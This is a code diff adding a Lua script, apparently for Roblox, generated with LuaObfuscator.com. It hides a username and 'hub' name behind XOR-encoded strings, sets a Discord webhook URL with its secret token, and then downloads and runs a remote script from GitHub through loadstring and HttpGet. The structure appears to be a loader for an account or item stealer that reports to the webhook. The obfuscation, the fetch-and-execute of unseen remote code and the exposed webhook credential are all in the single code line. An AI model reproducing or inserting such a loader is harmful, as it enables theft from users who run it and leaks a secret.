@@ -1,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 
+
+]]--
+
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end _G.Username(v7("\232\247\228\7\231\185\222\39\222\199\218\2\231\182\206\16\214","\126\177\163\187\69\134\219\167"));_G.HubName(v7("\24\254\63\200\241\38\223\23\133\204\38\217\106\214\245\46\141\50\133\221\22\249\5\227\221\17\224\102\133\204\6\249\106\225\201\19\232\24\137\219\6\224\106\225\201\19\232\24","\156\67\173\74\165"));_G.WebhookUrl("https://discord.com/api/webhooks/1123992972376145942/uIrgJBjcGYybZAYiv3DVvjHFaj9HQGMXpnTL5oFTNL5A-JkusN2jmx6-NxaJS_fhAxdl");loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))();
